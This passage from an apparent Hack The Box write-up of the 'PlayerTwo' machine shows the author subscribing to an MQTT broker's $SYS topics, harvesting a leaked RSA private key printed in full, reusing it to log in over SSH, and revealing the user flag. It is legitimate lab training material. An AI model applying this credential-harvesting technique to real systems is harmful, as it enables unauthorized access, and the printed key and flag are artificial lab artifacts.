* [https://mosquitto.org/man/mqtt-7.html](https://mosquitto.org/man/mqtt-7.html)

Next I did quite a bit of reading into the `Mosquitto` service, and found that it is a service for passing messages between applications and services.  Each can 'subscribe' to different topics, and will receive messages pushed to that topic, sort of like push notifications for apps on a cell phone.  It is intended to be lightweight and good for low power situations such as for IOT devices.  Perhaps if I could find the right topics to subscribe to, there would be some useful information that would help me to escalate my privileges.  

I found that to subscribe to topics I needed to use the `mosquitto_sub` program.  The man page at [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html) gave me all the info I needed.

> **mosquitto\_sub** is a simple MQTT version 5/3.1.1 client that will subscribe to topics and print the messages that it receives.
>
> Subscribe to all broker status messages:
>
> * mosquitto\_sub `-v` `-t` \$SYS/\#

```text
4.7.2  Topics beginning with $

The Server MUST NOT match Topic Filters starting with a wildcard character (# or +) with Topic Names beginning with a $ character [MQTT-4.7.2-1]. The Server SHOULD prevent Clients from using such Topic Names to exchange messages with other Clients. Server implementations MAY use Topic Names that start with a leading $ character for other purposes.

Non-normative comment

·         $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs

·         Applications cannot use a topic with a leading $ character for their own purposes

Non-normative comment

·         A subscription to “#” will not receive any messages published to a topic beginning with a $

·         A subscription to “+/monitor/Clients” will not receive any messages published to “$SYS/monitor/Clients”

·         A subscription to “$SYS/#” will receive messages published to topics beginning with “$SYS/”

·         A subscription to “$SYS/monitor/+” will receive messages published to “$SYS/monitor/Clients”

·         For a Client to receive messages from topics that begin with $SYS/ and from topics that don’t begin with a $, it has to subscribe to both “#” and “$SYS/#”
```

[https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html\#\_Toc3901014](https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014) describes that topic subscription as: 

> $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs

"Server-specific information or control APIs" sounded promising.

### Finding user creds

In order to subscribe to `$SYS/#` I used some information from the `mosquitto.conf` file and the port I had found open from netstat.  `mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v`

```text
observer@player2:~$ mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v
$SYS/broker/version mosquitto version 1.4.15
$SYS/broker/timestamp Tue, 18 Jun 2019 11:42:22 -0300
...snipped...
$SYS/internal/firmware/signing Retrieving the key from aws instance
$SYS/internal/firmware/signing Key retrieved..
$SYS/broker/uptime 319 seconds
...snipped...
$SYS/internal/firmware/signing -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4
et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT
+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz
SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE
+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd
62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN
wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D
62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO
91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC
gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y
QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f
llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos
JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3
JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt
ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP
QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T
pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4
hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf
PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI
NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt
uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M
zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK
/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==
-----END RSA PRIVATE KEY-----

$SYS/internal/firmware/signing Verifying signing..
$SYS/internal/firmware/signing Sent logs to apache server.
```

I now was the proud owner of a shiny new SSH key! I took it and tried to log in as the `egre55` and `observer` users I saw earlier.

```text
zweilos@kalimaa:~/htb/playertwo$ ssh -i observer_id_rsa observer@10.10.10.170

load pubkey "observer_id_rsa": invalid format
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 25 21:41:14 UTC 2020

  System load:  0.0                Processes:            167
  Usage of /:   26.1% of 19.56GB   Users logged in:      0
  Memory usage: 25%                IP address for ens33: 10.10.10.170
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

121 packages can be updated.
5 updates are security updates.


Last login: Sun Dec  1 15:33:19 2019 from 172.16.118.129
```

Success!  I was able to use the SSH private key to log in as the user `observer`.  While logging in I did notice a strange error `load pubkey "observer_id_rsa": invalid format`  but it didn't seem to cause any problems.  

### User.txt

First order of business...claim my hard-earned user flag!

```text
observer@player2:~$ cat user.txt 
b1aade7c541ab9a9cc82f34aaf61bcfa
```

_Yes, I know the real flag is in uppercase ._

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `observer`

While logging in, I noticed the MOTD stated `121 packages out of date, 5 security updates`.  I'm sure that at least 124 of those were rabbit holes so I didn't pay too much attention to it, and proceeded to enumerate the machine more deeply.

While looking through the files that had the SUID bit set, I noticed that `/opt/Configuration_Utility/Protobs`stood out. 

```text
observer@player2:~$ cd /opt/Configuration_Utility/
observer@player2:/opt/Configuration_Utility$ ls
ld-2.29.so  libc.so.6  Protobs
observer@player2:/opt/Configuration_Utility$ file Protobs 
Protobs: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Con, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped
```

It looked like I had found the configuration utility for the `protobs` program, which has the `setuid` bit set. This looks like something that could possibly be used to do my privilege escalation. The two `.so` files look like clues as to how the file is built, though unfortunately I am quite weak on C programming and with reverse engineering and binary exploitation, so this may be a bit beyond me for now. I will return to this one at a later date after I learn more.

### Root.txt

![Nope.](../.gitbook/assets/4-nope.png)

Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) & [`b14ckh34rt`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for creating such a fun and challenging machine.  I feel like I had to learn as much just to get User access for this one as I normally would in three or four easy - medium ones all together.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).

